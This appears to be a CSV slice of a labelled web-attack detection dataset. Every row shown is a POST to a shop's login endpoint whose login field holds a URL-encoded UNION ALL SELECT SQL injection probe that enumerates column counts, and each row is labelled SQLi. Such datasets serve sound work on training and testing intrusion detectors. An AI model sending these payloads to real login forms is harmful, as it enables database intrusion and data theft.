,id,method,path,query,label
4367,34367,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27HIIW%27%3D%27HIIW&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4368,34368,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27mCzY%27%3D%27mCzY&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4369,34369,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27dmUf%27%3D%27dmUf&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4370,34370,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20509%2C%20509%2C%20509%2C%20509%2C%20509%2C%20509%2C%20509%2C%20509%2C%20509%2C%20509%2C%20509--%20%20AND%20%27YLjs%27%3D%27YLjs&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4371,34371,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%206045%2C%206045%2C%206045%2C%206045%2C%206045%2C%206045%2C%206045%2C%206045%2C%206045%2C%206045%2C%206045%2C%206045--%20%20AND%20%27jGkc%27%3D%27jGkc&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4372,34372,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%208803%2C%208803%2C%208803%2C%208803%2C%208803%2C%208803%2C%208803%2C%208803%2C%208803%2C%208803%2C%208803%2C%208803%2C%208803--%20%20AND%20%27Manv%27%3D%27Manv&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4373,34373,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%201582%2C%201582%2C%201582%2C%201582%2C%201582%2C%201582%2C%201582%2C%201582%2C%201582%2C%201582%2C%201582%2C%201582%2C%201582%2C%201582--%20%20AND%20%27BksC%27%3D%27BksC&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4374,34374,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%203431%2C%203431%2C%203431%2C%203431%2C%203431%2C%203431%2C%203431%2C%203431%2C%203431%2C%203431%2C%203431%2C%203431%2C%203431%2C%203431%2C%203431--%20%20AND%20%27odfW%27%3D%27odfW&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4375,34375,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%205718%2C%205718%2C%205718%2C%205718%2C%205718%2C%205718%2C%205718%2C%205718%2C%205718%2C%205718%2C%205718%2C%205718%2C%205718%2C%205718%2C%205718%2C%205718--%20%20AND%20%27RmvU%27%3D%27RmvU&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4376,34376,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%209545%2C%209545%2C%209545%2C%209545%2C%209545%2C%209545%2C%209545%2C%209545%2C%209545%2C%209545%2C%209545%2C%209545%2C%209545%2C%209545%2C%209545%2C%209545%2C%209545--%20%20AND%20%27YBZg%27%3D%27YBZg&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4377,34377,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%205943%2C%205943%2C%205943%2C%205943%2C%205943%2C%205943%2C%205943%2C%205943%2C%205943%2C%205943%2C%205943%2C%205943%2C%205943%2C%205943%2C%205943%2C%205943%2C%205943%2C%205943--%20%20AND%20%27NeMj%27%3D%27NeMj&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4378,34378,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%206433%2C%206433%2C%206433%2C%206433%2C%206433%2C%206433%2C%206433%2C%206433%2C%206433%2C%206433%2C%206433%2C%206433%2C%206433%2C%206433%2C%206433%2C%206433%2C%206433%2C%206433%2C%206433--%20%20AND%20%27qxjj%27%3D%27qxjj&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4379,34379,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%203611%2C%203611%2C%203611%2C%203611%2C%203611%2C%203611%2C%203611%2C%203611%2C%203611%2C%203611%2C%203611%2C%203611%2C%203611%2C%203611%2C%203611%2C%203611%2C%203611%2C%203611%2C%203611%2C%203611--%20%20AND%20%27UPQw%27%3D%27UPQw&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4380,34380,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27MQct%27%3D%27MQct&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4381,34381,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27gIHF%27%3D%27gIHF&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4382,34382,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27PMzp%27%3D%27PMzp&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4383,34383,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27jWwX%27%3D%27jWwX&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4384,34384,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27IIxo%27%3D%27IIxo&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4385,34385,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27BUMU%27%3D%27BUMU&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4386,34386,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27MkLw%27%3D%27MkLw&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4387,34387,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27mEBk%27%3D%27mEBk&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4388,34388,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27ukQE%27%3D%27ukQE&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4389,34389,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27GdMq%27%3D%27GdMq&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4390,34390,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285%2C%209285--%20%20AND%20%27LmYl%27%3D%27LmYl&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4391,34391,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838--%20%20AND%20%27yBuS%27%3D%27yBuS&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4392,34392,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601%2C%201601--%20%20AND%20%27jJyM%27%3D%27jJyM&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4393,34393,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687%2C%207687--%20%20AND%20%27mAPb%27%3D%27mAPb&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4394,34394,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147%2C%205147--%20%20AND%20%27ylBi%27%3D%27ylBi&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4395,34395,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284%2C%205284--%20%20AND%20%27hueV%27%3D%27hueV&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4396,34396,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106%2C%205106--%20%20AND%20%27qQqH%27%3D%27qQqH&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4397,34397,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828%2C%202828--%20%20AND%20%27ujUz%27%3D%27ujUz&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4398,34398,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391%2C%206391--%20%20AND%20%27WyGF%27%3D%27WyGF&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4399,34399,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371%2C%208371--%20%20AND%20%27wwVU%27%3D%27wwVU&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4400,34400,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27TzxC%27%3D%27TzxC&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4401,34401,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27FQsY%27%3D%27FQsY&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4402,34402,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27cZpY%27%3D%27cZpY&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4403,34403,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27THFx%27%3D%27THFx&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4404,34404,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27whZM%27%3D%27whZM&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4405,34405,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27LKaD%27%3D%27LKaD&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4406,34406,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27poIi%27%3D%27poIi&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4407,34407,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27FvpU%27%3D%27FvpU&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4408,34408,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27Ctep%27%3D%27Ctep&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4409,34409,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%27Twuf%27%3D%27Twuf&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4410,34410,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378%2C%203378--%20%20AND%20%27pybi%27%3D%27pybi&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4411,34411,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133%2C%208133--%20%20AND%20%27nbMP%27%3D%27nbMP&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4412,34412,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701%2C%20701--%20%20AND%20%27SdAl%27%3D%27SdAl&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4413,34413,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027%2C%2027--%20%20AND%20%27YAll%27%3D%27YAll&pwd=FrAmE30.&remember=&modo=entrar,SQLi
4414,34414,POST,/tienda1/publico/autenticar.jsp,login=d%27z%220%27%20UNION%20ALL%20SELECT%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206%2C%207206--%20%20AND%20%27MxNk%27%3D%27MxNk&pwd=FrAmE30.&remember=&modo=entrar,SQLi
